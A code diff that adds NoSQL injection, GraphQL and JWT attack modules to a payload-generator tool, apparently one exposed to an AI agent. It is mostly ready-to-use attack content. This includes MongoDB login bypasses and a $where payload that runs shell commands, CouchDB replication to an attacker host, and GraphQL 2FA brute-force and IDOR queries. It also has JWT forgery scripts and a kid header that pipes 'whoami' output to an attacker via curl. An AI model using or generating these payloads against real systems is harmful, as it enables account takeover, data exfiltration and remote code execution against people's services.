@@ -14,6 +14,9 @@
  * - Command injection: per-OS (Linux / Windows), per-context (system / exec / backtick / pipe)
  * - SSTI: per-engine (Jinja2 / Twig / Freemarker / Velocity / Smarty)
  * - CRLF injection / Smuggling
+ * - NoSQLi: MongoDB / CouchDB / Cassandra — operator injection ($ne/$gt/$regex/$where), JS injection
+ * - GraphQLi: introspection / batch / aliases / field-suggestion leak / IDOR via direct object ref
+ * - JWT: alg=none / HS256-RS256 confusion / weak-secret brute / kid injection / jwk embed / x5u
  */
 
 import { exec as execCb } from 'child_process'
@@ -30,14 +33,19 @@ type XssContext = 'html' | 'attr' | 'js' | 'script' | 'event' | 'url' | 'all'
 type LfiWrapper = 'php-filter' | 'data' | 'expect' | 'pearcmd' | 'proc-self' | 'log' | 'win' | 'all'
 type RcePlatform = 'linux' | 'windows' | 'php' | 'python' | 'java' | 'node' | 'all'
 type SerializationEngine = 'java' | 'php' | 'python' | 'dotnet' | 'node'
+type NosqlDb = 'mongodb' | 'couchdb' | 'cassandra' | 'all'
+type NosqlContext = 'auth-bypass' | 'extract' | 'js-injection' | 'blind' | 'all'
+type JwtAttack = 'none' | 'alg-confusion' | 'weak-secret' | 'kid-injection' | 'jwk-embed' | 'x5u' | 'all'
+type GraphqlOp = 'introspect' | 'batch' | 'aliases' | 'suggestions' | 'idor' | 'sqli-via-graphql' | 'all'
 
 interface PayloadGeneratorInput {
   category:
     | 'xss' | 'sqli' | 'lfi' | 'rfi' | 'deserialization' | 'path_traversal'
     | 'xxe' | 'ssrf' | 'cmdi' | 'ssti' | 'crlf' | 'smuggle'
+    | 'nosqli' | 'graphql' | 'jwt'
   // Category-specific:
-  context?: XssContext | SqliContext | string
-  database?: SqliDb
+  context?: XssContext | SqliContext | NosqlContext | string
+  database?: SqliDb | NosqlDb
   waf?: WafBypass
   wrapper?: LfiWrapper
   platform?: RcePlatform
@@ -47,6 +55,10 @@ interface PayloadGeneratorInput {
   file?: string
   command?: string
   reflection?: string
+  nosql_db?: NosqlDb
+  attack?: JwtAttack | GraphqlOp
+  endpoint?: string
+  token?: string
 }
 
 function s(v: unknown): string {
@@ -689,6 +701,302 @@ function crlfPayloads(): string {
   return out.join('\n')
 }
 
+// ── NoSQL Injection payloads ───────────────────────────────────────────────
+
+function nosqliPayloads(db: NosqlDb, ctx: NosqlContext): string {
+  const out: string[] = ['[PayloadGenerator] NoSQL Injection Payloads', '═'.repeat(60), '']
+  out.push(`Database: ${db}  Context: ${ctx}`)
+  out.push('')
+  const push = (label: string, payload: string) => {
+    out.push(`## ${label}`)
+    out.push('```json')
+    out.push(payload)
+    out.push('```')
+    out.push('')
+  }
+
+  // MongoDB operator injection (string context — JSON body)
+  if (db === 'mongodb' || db === 'all') {
+    if (ctx === 'auth-bypass' || ctx === 'all') {
+      push('MongoDB — auth bypass via $ne (login form)',
+        '{"username":"admin","password":{"$ne":""}}')
+      push('MongoDB — auth bypass via $gt',
+        '{"username":"admin","password":{"$gt":""}}')
+      push('MongoDB — auth bypass via $exists',
+        '{"username":"admin","password":{"$exists":true}}')
+      push('MongoDB — auth bypass via $regex',
+        '{"username":"admin","password":{"$regex":".*"}}')
+      push('MongoDB — auth bypass via $in array',
+        '{"username":"admin","password":{"$in":["","x"]}}')
+      push('MongoDB — query param style (URL-encoded JSON in REST)',
+        'username=admin&password[$ne]=x')
+      push('MongoDB — nested operator array (Express body-parser quirk)',
+        'username=admin&password[$gt]=&__proto__[password]=$ne')
+      push('MongoDB — empty operator (matches nothing vs matches anything depending on schema)',
+        '{"password":{}}')
+    }
+    if (ctx === 'extract' || ctx === 'all') {
+      push('MongoDB — character-by-character extraction via $regex',
+        '{"username":"admin","password":{"$regex":"^a"}}')
+      push('MongoDB — fast extraction with $where (any char check)',
+        '{"$where":"this.password.charAt(0)==\'a\'"}')
+      push('MongoDB — full dump via $where JavaScript',
+        '{"$where":"function(){var s=db.getCollectionNames();for(var i in s){print(s[i]);}return false;}"}')
+      push('MongoDB — error-based via $toString on invalid type',
+        '{"$expr":{"$toString":"$non_existent_field"}}')
+    }
+    if (ctx === 'js-injection' || ctx === 'all') {
+      push('MongoDB — server-side JS via $where (RCE if mongo enabled eval)',
+        '{"$where":"sleep(5000)"}')
+      push('MongoDB — server-side JS execution via mapReduce',
+        '{"$where":"this.x.constructor.constructor(\'return this\')().process.mainModule.require(\'child_process\').execSync(\'id\')"}')
+      push('MongoDB — server-side JS via $accumulator (RCE)',
+        '{"$accumulator":{"init":"function(){return 0}","accumulate":"function(state,value){return state+value}","accumulateArgs":["$$ROOT.x"],"merge":"function(a,b){return a+b}","lang":"js"}}')
+    }
+    if (ctx === 'blind' || ctx === 'all') {
+      push('MongoDB — blind via $regex timing',
+        '{"password":{"$regex":"^a.{1000}.*$"}}')
+      push('MongoDB — blind via $where sleep',
+        '{"$where":"sleep(5000)||true"}')
+    }
+  }
+
+  // CouchDB
+  if (db === 'couchdb' || db === 'all') {
+    push('CouchDB — Mango query selector injection (auth bypass)',
+      '{"selector":{"_id":"_design/admin","valid":{"$gt":null}}}')
+    push('CouchDB — _all_docs key injection',
+      '?startkey="_"&endkey="\\ufff0"&include_docs=true')
+    push('CouchDB — replication trigger (POST /_replicate)',
+      '{"source":"users","target":"http://attacker/exfil"}')
+    push('CouchDB — config db read (admin only)',
+      'GET /_config/')
+  }
+
+  // Cassandra CQL
+  if (db === 'cassandra' || db === 'all') {
+    push('Cassandra CQL — batch statement injection',
+      "INSERT INTO users (id, password) VALUES (1, 'x'); UPDATE users SET role='admin' WHERE id=1;--")
+    push('Cassandra — BATCH injection (no transaction rollback on error)',
+      "BEGIN BATCH INSERT INTO users(id,password) VALUES(1,'x'); UPDATE users SET role='admin' WHERE id=1; APPLY BATCH")
+    push('Cassandra — ALLOW FILTERING on missing index (info leak via timing)',
+      "SELECT * FROM users WHERE password='x' ALLOW FILTERING")
+  }
+
+  out.push('## Generic JSON operator injection helper')
+  out.push('```json')
+  out.push('// Append operator keys to any user-controlled field name in a JSON body:')
+  out.push('{"username":{"$ne":"x"},"password":{"$gt":""}}')
+  out.push('// Test these keys in order (some apps only block $ne, allow $regex):')
+  out.push('// $ne, $gt, $gte, $lt, $lte, $in, $nin, $exists, $regex, $where, $or, $and, $not, $nor')
+  out.push('```')
+
+  return out.join('\n')
+}
+
+// ── GraphQL Injection payloads ─────────────────────────────────────────────
+
+function graphqlPayloads(op: GraphqlOp, endpoint: string): string {
+  const out: string[] = ['[PayloadGenerator] GraphQL Injection Payloads', '═'.repeat(60), '']
+  out.push(`Operation: ${op}  Endpoint: ${endpoint || '/graphql'}`)
+  out.push('')
+  const push = (label: string, payload: string) => {
+    out.push(`## ${label}`)
+    out.push('```graphql')
+    out.push(payload)
+    out.push('```')
+    out.push('')
+  }
+
+  if (op === 'introspect' || op === 'all') {
+    push('Full introspection (GET schema)',
+      'query { __schema { types { name fields { name type { name kind ofType { name } } } } } }')
+    push('Query introspection only (lighter)',
+      '{ __schema { queryType { name fields { name args { name type { name } } type { name kind ofType { name } } } } } }')
+    push('Mutation introspection',
+      '{ __schema { mutationType { name fields { name args { name type { name } } } } } }')
+    push('Subscription introspection',
+      '{ __schema { subscriptionType { name fields { name } } } }')
+  }
+
+  if (op === 'batch' || op === 'all') {
+    push('Batch query — brute force 2FA codes via aliases',
+      'query { a:verify(code: "000000") b:verify(code: "000001") c:verify(code: "000002") /*...100 aliases...*/ }')
+    push('Batch as array (legacy batch endpoint)',
+      '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"}]')
+    push('Batch — bypass rate limit by submitting many in one request',
+      '[{"query":"mutation{login(user:\"a\",pass:\"b\"){token}}"}, /* x 50 */]')
+  }
+
+  if (op === 'aliases' || op === 'all') {
+    push('Alias-based field enumeration (same field, different aliases = parallel queries)',
+      '{ a:__type(name:"User"){name} b:__type(name:"Admin"){name} c:__type(name:"Secret"){name} }')
+    push('Alias-based password brute force on single field',
+      '{ a:login(user:"admin",pass:"a"){ok} b:login(user:"admin",pass:"b"){ok} c:login(user:"admin",pass:"c"){ok} }')
+  }
+
+  if (op === 'suggestions' || op === 'all') {
+    push('Field suggestion leak (typo exposes field names)',
+      '{ __schema { queryType { fields { name } } } }  // then GET with non-existent field')
+    push('Field suggestions via /graphql?query= syntax',
+      "GET /graphql?query={userz{id}}  // error: \"Did you mean user?\"")
+  }
+
+  if (op === 'idor' || op === 'all') {
+    push('IDOR via direct object reference (objectId increment)',
+      '{ user(id: 1) { email ssn passwordHash } }')
+    push('IDOR via alias batch (dump all users in one request)',
+      '{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} d:user(id:4){email} }')
+    push('IDOR via persisted query / cursor pagination bypass',
+      '{ posts(after: null, first: 1000) { edges { node { author { privateEmail } } } } }')
+    push('IDOR via fragment on hidden fields',
+      'fragment FullUser on User { id email ssn passwordHash privateKey }  query { user(id: 1) { ...FullUser } }')
+  }
+
+  if (op === 'sqli-via-graphql' || op === 'all') {
+    push('GraphQL → SQL via resolver (if backend uses string concat)',
+      '{ user(name: "admin\' OR 1=1--") { id } }')
+    push('GraphQL → NoSQL via resolver',
+      '{ user(filter: "{\\"$ne\\":\\"x\\"}") { id } }')
+    push('GraphQL → SSRF via URL field',
+      '{ preview(url: "http://127.0.0.1:6379/") { html } }')
+    push('GraphQL → OS command via resolver',
+      '{ ping(host: "; id") { output } }')
+  }
+
+  out.push('## Postman-style raw query (POST application/json)')
+  out.push('```json')
+  out.push(JSON.stringify({
+    query: 'query Introspection { __schema { types { name } } }',
+    variables: {},
+    operationName: 'Introspection',
+  }, null, 2))
+  out.push('```')
+
+  return out.join('\n')
+}
+
+// ── JWT Attack payloads ────────────────────────────────────────────────────
+
+function jwtPayloads(attack: JwtAttack, token: string): string {
+  const out: string[] = ['[PayloadGenerator] JWT Attack Payloads', '═'.repeat(60), '']
+  out.push(`Attack: ${attack}  Token: ${token || '<paste JWT here, format header.payload.signature>'}`)
+  out.push('')
+  const push = (label: string, payload: string) => {
+    out.push(`## ${label}`)
+    out.push('```')
+    out.push(payload)
+    out.push('```')
+    out.push('')
+  }
+  const pushJson = (label: string, payload: string) => {
+    out.push(`## ${label}`)
+    out.push('```json')
+    out.push(payload)
+    out.push('```')
+    out.push('')
+  }
+
+  const sampleDecodedHeader = '{"alg":"HS256","typ":"JWT"}'
+  const sampleDecodedPayload = '{"sub":"1234567890","name":"John Doe","admin":false,"exp":9999999999}'
+
+  // ── alg=none ──
+  if (attack === 'none' || attack === 'all') {
+    pushJson('alg=none (classic — most modern libs reject, still worth testing)',
+      JSON.stringify({ header: { alg: 'none', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
+    pushJson('alg=None (case bypass)',
+      JSON.stringify({ header: { alg: 'None', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
+    pushJson('alg=NONE',
+      JSON.stringify({ header: { alg: 'NONE', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
+    pushJson('alg=nOnE (mixed)',
+      JSON.stringify({ header: { alg: 'nOnE', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
+    pushJson('alg=HS256 with empty signature',
+      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
+    pushJson('alg=HS256 with signature stripped (just header.payload.)',
+      JSON.stringify({ note: 'Keep the trailing dot — some libs treat missing sig as no-op' }))
+  }
+
+  // ── Algorithm confusion (HS256 ↔ RS256) ──
+  if (attack === 'alg-confusion' || attack === 'all') {
+    push('HS256 / RS256 confusion — re-sign token with HMAC using the public key as secret',
+      '// Step 1: GET /.well-known/jwks.json or PEM public key from /api/auth/public-key')
+    push('Step 2 — convert RSA public key PEM to raw bytes (one-liner)',
+      `openssl rsa -pubin -in public.pem -modulus -noout | sed 's/Modulus=//' | xxd -r -p > pubkey.der`)
+    push('Step 3 — forge token with HMAC(public_key, header.payload)',
+      `// Header: {"alg":"HS256","typ":"JWT"}  // changed from RS256`)
+    push('Python forgery script',
+      `import jwt, base64\n` +
+      `pub = open("public.pem","rb").read()\n` +
+      `forged = jwt.encode({"sub":"admin","admin":True}, pub, algorithm="HS256")\n` +
+      `print(forged)`)
+    push('Node forgery script (jsonwebtoken)',
+      `const jwt = require('jsonwebtoken');\n` +
+      `const pub = require('fs').readFileSync('public.pem');\n` +
+      `const forged = jwt.sign({sub:'admin',admin:true}, pub, {algorithm:'HS256'});`)
+    push('Step 4 — sometimes also works with HS384/HS512 (just change header alg)',
+      `// alg HS512, RS384 → HS384, RS512 → HS512`)
+  }
+
+  // ── Weak HMAC secret brute force ──
+  if (attack === 'weak-secret' || attack === 'all') {
+    push('Common weak secrets (top of wordlist for jwt-cracker / hashcat -m 16500)',
+      'secret\nsecret123\nsecret1234\npassword\npassword123\n123456\n12345678\nqwerty\nadmin\nkey\njwt\njwt_secret\nchangeme\ndefault\ntest\nhmac\nhmac-secret\nsuper-secret\nmy-secret\nyour-256-bit-secret\nyour-secret-key\nkeyboard cat\nshhh')
+    push('jwt-cracker (preferred — uses common JWT weak-secret wordlists)',
+      'jwt-cracker <token> -w /usr/share/wordlists/jwt-secrets.txt')
+    push('hashcat (when jwt-cracker not enough)',
+      'hashcat -m 16500 token.txt jwt-secrets.txt')
+    push('Python one-liner (single secret attempt)',
+      `python -c "import jwt; print(jwt.decode('${token || '<TOKEN>'}', 'secret', algorithms=['HS256']))"`)
+    push('CyberChef recipe (manual)',
+      '// From header, get alg → use HMAC or RSA check on signature with candidate secret')
+  }
+
+  // ── kid injection ──
+  if (attack === 'kid-injection' || attack === 'all') {
+    pushJson('kid — path traversal to /dev/null (sig becomes empty hash, easy to forge)',
+      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: '/dev/null' }, payload: sampleDecodedPayload }))
+    pushJson('kid — SQL injection (concat secret with attacker-controlled string)',
+      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: "1' UNION SELECT 'a'--" }, payload: sampleDecodedPayload }))
+    pushJson('kid — command injection (exec → fetch via curl)',
+      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: '| curl http://attacker/`whoami`' }, payload: sampleDecodedPayload }))
+    pushJson('kid — SSRF via file:// or http:// to attacker',
+      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: 'http://attacker/key.pem' }, payload: sampleDecodedPayload }))
+    pushJson('kid — null byte / dot path traversal',
+      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: '../../../../dev/null' }, payload: sampleDecodedPayload }))
+  }
+
+  // ── jwk embed (self-signed, attacker controls the key) ──
+  if (attack === 'jwk-embed' || attack === 'all') {
+    pushJson('jwk header — embed your own RSA public key as the verification key',
+      JSON.stringify({ header: { alg: 'RS256', typ: 'JWT', jwk: { kty: 'RSA', e: 'AQAB', n: '<attacker RSA modulus, base64url>', use: 'sig' } }, payload: sampleDecodedPayload }))
+    push('Generate attacker key pair',
+      'openssl genrsa -out attacker.pem 2048 && openssl rsa -in attacker.pem -pubout -out attacker.pub')
+    push('Forge token with attacker private key (signed with attacker key, verifies with attacker public key from header)',
+      `// Node: jwt.sign(payload, attackerPrivateKey, {algorithm:'RS256', header:{jwk:attackerPublicJwk}})`)
+  }
+
+  // ── x5u ──
+  if (attack === 'x5u' || attack === 'all') {
+    pushJson('x5u — point to attacker-hosted certificate chain',
+      JSON.stringify({ header: { alg: 'RS256', typ: 'JWT', x5u: 'http://attacker.com/cert.pem' }, payload: sampleDecodedPayload }))
+    push('Steps',
+      '1) Generate self-signed cert: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n' +
+      '2) Host cert.pem on attacker.com\n' +
+      '3) Sign token with key.pem\n' +
+      '4) Some libraries blindly fetch x5u and verify with the cert')
+  }
+
+  out.push('## Universal verification helper (Node.js)')
+  out.push('```javascript')
+  out.push('function decodeJwt(t) {')
+  out.push('  const [h,p] = t.split(".").map(s => JSON.parse(Buffer.from(s,"base64url").toString()));')
+  out.push('  return { header: h, payload: p };')
+  out.push('}')
+  out.push('```')
+
+  return out.join('\n')
+}
+
 // ── Tool definition ────────────────────────────────────────────────────────
 
 export class PayloadGeneratorTool implements Tool {
@@ -713,31 +1021,41 @@ export class PayloadGeneratorTool implements Tool {
 - ssti: Server-side template injection (Jinja2 / Twig / FreeMarker / Velocity / Smarty)
 - crlf: CRLF injection + HTTP Request Smuggling (CL.TE / TE.CL / H2 downgrade)
 - smuggle: HTTP Request Smuggling variants
+- nosqli: NoSQL injection (MongoDB $ne/$gt/$regex/$where/JS-injection / CouchDB Mango / Cassandra CQL batch)
+- graphql: GraphQL (introspection / batch / aliases / suggestions / IDOR / sqli-via-graphql)
+- jwt: JWT attacks (alg=none / HS256-RS256 confusion / weak-secret / kid SQLi/path-traversal / jwk embed / x5u)
 
 ## Usage
 PayloadGenerator({ category: 'sqli', database: 'mysql', context: 'union', waf: 'cloudflare' })
 PayloadGenerator({ category: 'xss', context: 'all' })
 PayloadGenerator({ category: 'lfi', wrapper: 'pearcmd' })
 PayloadGenerator({ category: 'deserialization', engine: 'java', gadget: 'CommonsCollections' })
-PayloadGenerator({ category: 'ssrf', target_url: 'http://127.0.0.1:8080/admin' })`,
+PayloadGenerator({ category: 'ssrf', target_url: 'http://127.0.0.1:8080/admin' })
+PayloadGenerator({ category: 'nosqli', nosql_db: 'mongodb', context: 'auth-bypass' })
+PayloadGenerator({ category: 'graphql', attack: 'introspect', endpoint: '/graphql' })
+PayloadGenerator({ category: 'jwt', attack: 'alg-confusion' })`,
       parameters: {
         type: 'object',
         properties: {
           category: {
             type: 'string',
-            enum: ['xss', 'sqli', 'lfi', 'rfi', 'deserialization', 'path_traversal', 'xxe', 'ssrf', 'cmdi', 'ssti', 'crlf', 'smuggle'],
+            enum: ['xss', 'sqli', 'lfi', 'rfi', 'deserialization', 'path_traversal', 'xxe', 'ssrf', 'cmdi', 'ssti', 'crlf', 'smuggle', 'nosqli', 'graphql', 'jwt'],
             description: 'Payload category',
           },
-          context: { type: 'string', description: 'XSS context (html/attr/js/script/event/url) or SQLi context (union/boolean/time/error/stacked)' },
+          context: { type: 'string', description: 'XSS context (html/attr/js/script/event/url) or SQLi context (union/boolean/time/error/stacked) or NoSQLi context (auth-bypass/extract/js-injection/blind)' },
           database: { type: 'string', enum: ['mysql', 'mssql', 'postgres', 'oracle', 'sqlite', 'all'], description: 'Target SQL database (sqli category)' },
+          nosql_db: { type: 'string', enum: ['mongodb', 'couchdb', 'cassandra', 'all'], description: 'Target NoSQL database (nosqli category)' },
           waf: { type: 'string', enum: ['cloudflare', 'modsecurity', 'f5', 'akamai', 'generic'], description: 'Target WAF for bypass variants' },
           wrapper: { type: 'string', enum: ['php-filter', 'data', 'expect', 'pearcmd', 'proc-self', 'log', 'win', 'all'], description: 'LFI wrapper' },
           platform: { type: 'string', enum: ['linux', 'windows', 'php', 'python', 'java', 'node', 'all'], description: 'RCE platform' },
           engine: { type: 'string', enum: ['java', 'php', 'python', 'dotnet', 'node'], description: 'Deserialization engine' },
+          attack: { type: 'string', description: 'JWT attack type (none/alg-confusion/weak-secret/kid-injection/jwk-embed/x5u) or GraphQL operation (introspect/batch/aliases/suggestions/idor/sqli-via-graphql)' },
           gadget: { type: 'string', description: 'Gadget name (CommonsCollections5, Spring1, etc.) — auto = all' },
           file: { type: 'string', description: 'Target file for LFI / path-traversal / XXE' },
           command: { type: 'string', description: 'Command for RCE' },
           target_url: { type: 'string', description: 'Target URL for SSRF' },
+          endpoint: { type: 'string', description: 'GraphQL endpoint URL/path' },
+          token: { type: 'string', description: 'JWT token to analyze' },
         },
         required: ['category'],
       },
@@ -789,6 +1107,24 @@ PayloadGenerator({ category: 'ssrf', target_url: 'http://127.0.0.1:8080/admin' }
         case 'crlf':
         case 'smuggle':
           output = crlfPayloads()
+          break
+        case 'nosqli':
+          output = nosqliPayloads(
+            (s(p.nosql_db) as NosqlDb) || (s(p.database) as NosqlDb) || 'all',
+            (s(p.context) as NosqlContext) || 'all',
+          )
+          break
+        case 'graphql':
+          output = graphqlPayloads(
+            (s(p.attack) as GraphqlOp) || 'all',
+            s(p.endpoint || p.target_url),
+          )
+          break
+        case 'jwt':
+          output = jwtPayloads(
+            (s(p.attack) as JwtAttack) || 'all',
+            s(p.token),
+          )
           break
         default:
           return { content: `Unknown category: ${category}`, isError: true }
